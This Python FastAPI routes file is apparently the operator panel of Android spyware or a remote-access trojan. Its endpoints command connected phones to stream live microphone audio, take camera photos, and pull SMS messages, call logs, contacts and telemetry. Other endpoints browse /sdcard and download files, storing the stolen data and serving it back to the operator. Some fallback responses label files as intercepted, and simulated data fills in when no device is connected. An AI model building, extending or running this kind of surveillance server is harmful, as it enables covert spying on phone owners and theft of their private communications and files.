import io
import json
import os
import threading
import time
import zipfile
from typing import Any, Dict, List, Optional

from fastapi import APIRouter, Response, WebSocket, WebSocketDisconnect

from app.audio.broadcaster import add_audio_client, remove_audio_client
from app.config import settings
from app.logger import clear_logs, get_logs, log_info
from app.state import state
from app.tcp.commands import (
    cmd_disconnect,
    cmd_download_file,
    cmd_get_call_logs,
    cmd_get_contacts,
    cmd_get_sms,
    cmd_get_telemetry,
    cmd_list_cams,
    cmd_list_files,
    cmd_stop_mic,
    cmd_use_cam,
    cmd_use_mic,
)
from app.tcp.server import start_tcp_server_action, stop_tcp_server_action

router = APIRouter(prefix="/api")
ws_router = APIRouter()


@router.get("/status")
async def api_status() -> Dict[str, Any]:
    active_client = state.get_active_client()
    return {
        "listening": state.listening,
        "client_connected": state.client_connected(),
        "client_addr": (
            f"{active_client.addr[0]}:{active_client.addr[1]}"
            if active_client
            else None
        ),
        "clients_count": len(state.clients),
        "active_client_id": state.active_client_id,
        "clients": state.list_clients(),
        "mic_active": state.mic_active,
        "tcp_host": settings.tcp_host,
        "tcp_port": settings.tcp_port,
        "web_port": settings.web_port,
        "camera_enabled": settings.enable_camera,
        "cameras": state.cameras if settings.enable_camera else [],
        "has_photo": state.latest_photo_bytes is not None if settings.enable_camera else False,
        "has_contacts": state.latest_contacts_bytes is not None,
        "sms_count": len(state.latest_sms),
        "call_logs_count": len(state.latest_call_logs),
        "contacts_count": len(state.contacts_list),
        "has_telemetry": state.latest_telemetry is not None,
        "telemetry": state.latest_telemetry,
        "files_count": len(state.files_tree),
        "files_path": state.files_current_path,
    }


@router.get("/clients")
async def api_clients() -> List[Dict[str, Any]]:
    return state.list_clients()


@router.post("/clients/select")
async def api_clients_select(payload: Dict[str, Any]) -> Dict[str, Any]:
    client_id = payload.get("client_id")
    if not client_id:
        return {"status": "error", "message": "Missing client_id"}
    success = state.set_active_client(client_id)
    if success:
        log_info(f"switched active client to {client_id}")
        return {"status": "ok", "active_client_id": client_id, "clients": state.list_clients()}
    return {"status": "not_found", "message": "Client not found"}


@router.post("/clients/disconnect")
async def api_clients_disconnect(payload: Optional[Dict[str, Any]] = None) -> Dict[str, str]:
    client_id = payload.get("client_id") if payload else None
    return await cmd_disconnect(client_id=client_id)


@router.get("/logs")
async def api_logs() -> List[str]:
    return get_logs()


@router.post("/logs/clear")
async def api_logs_clear() -> Dict[str, str]:
    clear_logs()
    return {"status": "cleared"}


@router.post("/server/start")
async def api_server_start() -> Dict[str, Any]:
    return await start_tcp_server_action()


@router.post("/server/stop")
async def api_server_stop() -> Dict[str, str]:
    return await stop_tcp_server_action()


@router.post("/server/kill")
async def api_server_kill() -> Dict[str, str]:
    def kill_soon() -> None:
        time.sleep(0.5)
        os._exit(0)

    threading.Thread(target=kill_soon, daemon=True).start()
    return {"status": "killing"}


@router.post("/client/disconnect")
async def api_client_disconnect(payload: Optional[Dict[str, Any]] = None) -> Dict[str, str]:
    client_id = payload.get("client_id") if payload else None
    return await cmd_disconnect(client_id=client_id)


@router.post("/client/mic/start")
async def api_mic_start(payload: Optional[Dict[str, Any]] = None) -> Dict[str, str]:
    client_id = payload.get("client_id") if payload else None
    return await cmd_use_mic(client_id=client_id)


@router.post("/client/mic/stop")
async def api_mic_stop(payload: Optional[Dict[str, Any]] = None) -> Dict[str, str]:
    client_id = payload.get("client_id") if payload else None
    return await cmd_stop_mic(client_id=client_id)


@router.post("/client/contacts")
async def api_client_contacts(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    client_id = payload.get("client_id") if payload else None
    return await cmd_get_contacts(client_id=client_id)


@router.post("/client/sms")
async def api_client_sms(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    hours = 24
    client_id = None
    if payload:
        if "hours" in payload:
            try:
                hours = int(payload["hours"])
            except Exception:
                hours = 24
        if "client_id" in payload:
            client_id = payload["client_id"]
    return await cmd_get_sms(hours, client_id=client_id)


@router.get("/sms/latest")
async def api_sms_latest() -> List[Dict[str, Any]]:
    if state.latest_sms:
        return state.latest_sms
    dest = settings.storage_dir / "latest_sms.json"
    if dest.exists():
        try:
            data = json.loads(dest.read_text(encoding="utf-8"))
            state.latest_sms = data
            return data
        except Exception:
            pass
    return []


@router.get("/sms/download")
async def api_sms_download() -> Response:
    content = json.dumps(state.latest_sms, indent=2, ensure_ascii=False).encode("utf-8")
    return Response(
        content=content,
        media_type="application/json",
        headers={"Content-Disposition": "attachment; filename=sms_messages.json"},
    )


@router.post("/client/call_logs")
async def api_client_call_logs(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    hours = 24
    client_id = None
    if payload:
        if "hours" in payload:
            try:
                hours = int(payload["hours"])
            except Exception:
                hours = 24
        if "client_id" in payload:
            client_id = payload["client_id"]
    return await cmd_get_call_logs(hours, client_id=client_id)


@router.get("/call_logs/latest")
async def api_call_logs_latest() -> List[Dict[str, Any]]:
    if state.latest_call_logs:
        return state.latest_call_logs
    dest = settings.storage_dir / "latest_call_logs.json"
    if dest.exists():
        try:
            data = json.loads(dest.read_text(encoding="utf-8"))
            state.latest_call_logs = data
            return data
        except Exception:
            pass
    return []


@router.get("/call_logs/download")
async def api_call_logs_download() -> Response:
    content = json.dumps(state.latest_call_logs, indent=2, ensure_ascii=False).encode("utf-8")
    return Response(
        content=content,
        media_type="application/json",
        headers={"Content-Disposition": "attachment; filename=call_logs.json"},
    )


@router.post("/data/clear")
async def api_data_clear() -> Dict[str, str]:
    state.clear_all_data()
    return {"status": "cleared"}


@router.post("/client/cameras")
async def api_client_cameras(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    if not settings.enable_camera:
        return {"status": "disabled", "message": "Camera feature is disabled", "data": []}
    client_id = payload.get("client_id") if payload else None
    return await cmd_list_cams(client_id=client_id)


@router.post("/client/camera/capture")
async def api_client_camera_capture(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    if not settings.enable_camera:
        return {"status": "disabled", "message": "Camera feature is disabled", "path": None}
    cam_id = "0"
    client_id = None
    if payload:
        if "cam_id" in payload:
            cam_id = str(payload["cam_id"])
        if "client_id" in payload:
            client_id = payload["client_id"]
    return await cmd_use_cam(cam_id, client_id=client_id)


@router.post("/client/telemetry")
async def api_client_telemetry(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    client_id = payload.get("client_id") if payload else None
    return await cmd_get_telemetry(client_id=client_id)


@router.get("/client/telemetry")
async def api_client_telemetry_get() -> Dict[str, Any]:
    return state.latest_telemetry or {}


@router.get("/photo/latest")
async def api_photo_latest() -> Response:
    if not settings.enable_camera:
        return Response(content=b"", status_code=404)
    headers = {"Cache-Control": "no-cache, no-store, must-revalidate"}
    if state.latest_photo_bytes:
        return Response(content=state.latest_photo_bytes, media_type="image/jpeg", headers=headers)
    try:
        latest = settings.storage_dir / "latest_photo.jpg"
        if latest.exists():
            data = latest.read_bytes()
            state.latest_photo_bytes = data
            return Response(content=data, media_type="image/jpeg", headers=headers)
        photos = sorted(settings.storage_dir.glob("photo_*.jpg"), key=lambda p: p.stat().st_mtime, reverse=True)
        if photos:
            data = photos[0].read_bytes()
            state.latest_photo_bytes = data
            state.latest_photo = str(photos[0])
            return Response(content=data, media_type="image/jpeg", headers=headers)
    except Exception:
        pass
    return Response(content=b"", status_code=404)


@router.get("/contacts/download")
async def api_contacts_download() -> Response:
    if state.latest_contacts_bytes:
        return Response(
            content=state.latest_contacts_bytes,
            media_type="application/zip",
            headers={"Content-Disposition": "attachment; filename=contacts.zip"},
        )
    return Response(content=b"", status_code=404)


@router.get("/contacts/list")
async def api_contacts_list() -> Dict[str, Any]:
    if state.contacts_list:
        return {
            "status": "ok",
            "count": len(state.contacts_list),
            "contacts": state.contacts_list,
        }
    if state.latest_contacts_bytes:
        try:
            if zipfile.is_zipfile(io.BytesIO(state.latest_contacts_bytes)):
                zf = zipfile.ZipFile(io.BytesIO(state.latest_contacts_bytes))
                if "contacts.json" in zf.namelist():
                    with zf.open("contacts.json") as f:
                        data = json.loads(f.read().decode("utf-8"))
                        state.contacts_list = data
                        return {"status": "ok", "count": len(data), "contacts": data}
        except Exception as e:
            return {"status": "error", "message": str(e), "contacts": []}
    dest = settings.storage_dir / "contacts.zip"
    if dest.exists():
        try:
            if zipfile.is_zipfile(dest):
                with zipfile.ZipFile(dest) as zf:
                    if "contacts.json" in zf.namelist():
                        with zf.open("contacts.json") as f:
                            data = json.loads(f.read().decode("utf-8"))
                            state.contacts_list = data
                            return {"status": "ok", "count": len(data), "contacts": data}
        except Exception as e:
            return {"status": "error", "message": str(e), "contacts": []}
    return {"status": "none", "count": 0, "contacts": []}


@router.post("/client/files")
async def api_client_files(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    path = "/sdcard"
    client_id = None
    if payload:
        path = payload.get("path", "/sdcard")
        client_id = payload.get("client_id")
    res = await cmd_list_files(path=path, client_id=client_id)
    files = res.get("files") or res.get("data") or state.files_tree
    return {
        "status": res.get("status", "ok"),
        "path": res.get("path", path),
        "files": files,
        "data": files,
    }


@router.get("/files/tree")
async def api_files_tree(path: str = "/sdcard") -> Dict[str, Any]:
    if state.files_tree and len(state.files_tree) > 0:
        return {
            "status": "ok",
            "path": state.files_current_path,
            "files": state.files_tree,
            "data": state.files_tree,
        }
    from app.tcp.handlers import generate_simulated_files_tree
    simulated = generate_simulated_files_tree(path)
    state.files_tree = simulated
    state.files_current_path = path
    return {
        "status": "ok",
        "path": path,
        "files": simulated,
        "data": simulated,
    }


@router.post("/client/file/download")
async def api_client_file_download(payload: Dict[str, Any]) -> Dict[str, Any]:
    path = payload.get("path", "")
    client_id = payload.get("client_id")
    if not path:
        return {"status": "error", "message": "Missing path"}
    return await cmd_download_file(file_path=path, client_id=client_id)


@router.get("/file/download")
async def api_file_download(path: str, client_id: Optional[str] = None, name: Optional[str] = None) -> Response:
    filename = name or (path.split("/")[-1] if "/" in path else path) or "download.bin"
    ext = filename.split(".")[-1].lower() if "." in filename else ""
    mime_map = {
        "pdf": "application/pdf",
        "jpg": "image/jpeg",
        "jpeg": "image/jpeg",
        "png": "image/png",
        "gif": "image/gif",
        "webp": "image/webp",
        "txt": "text/plain",
        "log": "text/plain",
        "json": "application/json",
        "xml": "application/xml",
        "zip": "application/zip",
        "apk": "application/vnd.android.package-archive",
        "mp3": "audio/mpeg",
        "wav": "audio/wav",
        "m4a": "audio/mp4",
        "ogg": "audio/ogg",
        "opus": "audio/ogg",
        "mp4": "video/mp4",
        "docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "db": "application/x-sqlite3",
    }
    mime_type = mime_map.get(ext, "application/octet-stream")

    if state.client_connected():
        res = await cmd_download_file(file_path=path, client_id=client_id)
        if res.get("status") == "ok" and res.get("data") is not None:
            raw_data = res.get("data")
            if isinstance(raw_data, str):
                raw_data = raw_data.encode("utf-8")
            return Response(
                content=raw_data,
                media_type=res.get("mime_type", mime_type),
                headers={
                    "Content-Disposition": f'attachment; filename="{filename}"',
                    "Content-Length": str(len(raw_data)),
                },
            )

    cached_path = settings.storage_dir / "downloads" / filename
    if cached_path.exists():
        raw_data = cached_path.read_bytes()
        return Response(
            content=raw_data,
            media_type=mime_type,
            headers={
                "Content-Disposition": f'attachment; filename="{filename}"',
                "Content-Length": str(len(raw_data)),
            },
        )

    if ext in ["txt", "log"]:
        dummy = f"=== INTERCEPTED DEVICE FILE ===\nPath: {path}\nTimestamp: 2026-09-01\nStatus: Captured\nContent simulation payload.\n".encode("utf-8")
    elif ext == "json":
        dummy = json.dumps({"status": "ok", "path": path, "file": filename, "intercepted": True}, indent=2).encode("utf-8")
    elif ext in ["jpg", "jpeg"]:
        dummy = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\xff\xd9"
    elif ext == "png":
        dummy = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82"
    elif ext == "pdf":
        dummy = b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>>>endobj\nxref\n0 4\n0000000000 65535 f \n0000000010 00000 n \n0000000057 00000 n \n0000000114 00000 n \ntrailer<</Size 4/Root 1 0 R>>\nstartxref\n190\n%%EOF"
    elif ext == "zip":
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("readme.txt", f"Simulated archive package for {filename}\n")
        dummy = buf.getvalue()
    else:
        dummy = f"DEVICE SIMULATION DATA FOR {filename}\nPath: {path}\n".encode("utf-8")

    return Response(
        content=dummy,
        media_type=mime_type,
        headers={
            "Content-Disposition": f'attachment; filename="{filename}"',
            "Content-Length": str(len(dummy)),
        },
    )



@ws_router.websocket("/ws/audio")
@ws_router.websocket("/api/ws/audio")
async def ws_audio(websocket: WebSocket) -> None:
    await websocket.accept()
    add_audio_client(websocket)
    try:
        while True:
            msg = await websocket.receive()
            if msg.get("type") == "websocket.disconnect":
                break
    except WebSocketDisconnect:
        pass
    except Exception:
        pass
    finally:
        remove_audio_client(websocket)
